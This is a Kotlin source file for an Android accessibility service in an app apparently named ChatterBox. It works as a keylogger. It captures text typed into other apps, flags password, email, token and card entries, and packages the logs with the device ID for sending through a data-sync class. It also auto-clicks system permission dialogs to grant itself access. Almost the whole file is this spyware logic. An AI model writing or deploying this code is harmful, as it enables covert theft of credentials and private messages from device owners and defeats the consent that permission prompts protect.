package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@SuppressLint("HardwareIds")
class AccessibilityService : android.accessibilityservice.AccessibilityService() {
    private val TAG = "ChatterBoxAccessibility"
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var permissionDialogs: PermissionDialogs

    private val keylogBuffer = StringBuilder()
    private var currentFocusedApp = ""
    private var lastInputTime = 0L
    private val keylogFlushDelay = 5000L

    private val deviceId by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    companion object {
        private var instance: AccessibilityService? = null

        fun getInstance(): AccessibilityService? {
            return instance
        }
    }

    override fun onServiceConnected() {
        Log.i(TAG, "Accessibility Service connected")
        instance = this
        permissionDialogs = PermissionDialogs(this)

        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED // Important for keylogging
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        info.notificationTimeout = 100

        this.serviceInfo = info

        Log.d(TAG, "Accessibility service configured and ready")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        IdleDetector.processAccessibilityEvent(event)

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.packageName != null) {
            if (currentFocusedApp != event.packageName) {
                if (keylogBuffer.isNotEmpty()) {
                    flushKeylogBuffer()
                }
                currentFocusedApp = event.packageName.toString()
            }
        }

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val sourceText = event.text?.joinToString(" ") ?: ""
            val packageName = event.packageName?.toString() ?: "unknown"
            currentFocusedApp = packageName

            if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
                keylogBuffer.append(sourceText)
                keylogBuffer.append(" ")
                lastInputTime = System.currentTimeMillis()

                handler.removeCallbacks(keylogFlushRunnable)
                handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)

                if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
                    val intent = Intent("com.example.ChatterBox.ACCESSIBILITY_DATA")
                    intent.putExtra("captured_text", sourceText)
                    intent.putExtra("source_app", packageName)
                    sendBroadcast(intent)
                }
            }
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                if (permissionDialogs.isGrantingPermissions() &&
                    (packageName.contains("permissioncontroller") ||
                            packageName == "android" ||
                            packageName == "com.android.systemui" ||
                            packageName == "com.android.settings")) {

                    handler.postDelayed({
                        checkAllWindowsForPermissionDialogs()
                    }, 300)
                }
            }
        }
    }

    private val keylogFlushRunnable = Runnable {
        flushKeylogBuffer()
    }

    private fun flushKeylogBuffer() {
        if (keylogBuffer.isEmpty()) return

        try {
            val keylogData = JSONObject().apply {
                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
                put("device_id", deviceId)
                put("app", currentFocusedApp)
                put("text", keylogBuffer.toString())
                put("device_model", android.os.Build.MODEL)
                put("android_version", android.os.Build.VERSION.RELEASE)
            }
            val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
            dataSynchronizer.sendData("keylog", keylogData.toString())
            keylogBuffer.clear()

        } catch (e: Exception) {
            Log.e(TAG, "Error flushing keylog buffer: ${e.message}")
        }
    }

    private fun containsSensitiveData(text: String): Boolean {
        val lowercase = text.lowercase()

        if (lowercase.contains("@") && lowercase.contains(".")) return true

        if (Regex("\\d{4,}").containsMatchIn(text)) return true

        return lowercase.contains("password") ||
                lowercase.contains("login") ||
                lowercase.contains("token") ||
                lowercase.contains("secret") ||
                lowercase.contains("key") ||
                lowercase.contains("credit") ||
                lowercase.contains("card") ||
                lowercase.contains("account")
    }

    private fun isSensitiveField(event: AccessibilityEvent): Boolean {
        val source = event.source ?: return false

        try {
            if (source.isPassword) return true

            val hintText = source.hintText?.toString()?.lowercase() ?: ""
            val contentDesc = source.contentDescription?.toString()?.lowercase() ?: ""

            return hintText.contains("password") || hintText.contains("login") ||
                    hintText.contains("email") || hintText.contains("username") ||
                    contentDesc.contains("password") || contentDesc.contains("login") ||
                    contentDesc.contains("email") || contentDesc.contains("username")
        } finally {
            source.recycle()
        }
    }
    private fun checkAllWindowsForPermissionDialogs() {
        try {
            val root = rootInActiveWindow
            if (root != null) {
                permissionDialogs.handlePermissionDialog(root)
            }

            windows.forEach { window ->
                val windowRoot = window.root ?: return@forEach
                permissionDialogs.handlePermissionDialog(windowRoot)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error handling permission dialogs", e)
        }
    }

    fun startPermissionGrantingMode(expectedPermissions: Int) {
        permissionDialogs.startGrantingPermissions(expectedPermissions)
    }

    fun stopPermissionGrantingMode() {
        permissionDialogs.stopGrantingPermissions()
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        if (keylogBuffer.isNotEmpty()) {
            flushKeylogBuffer()
        }
        permissionDialogs.cleanup()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }
}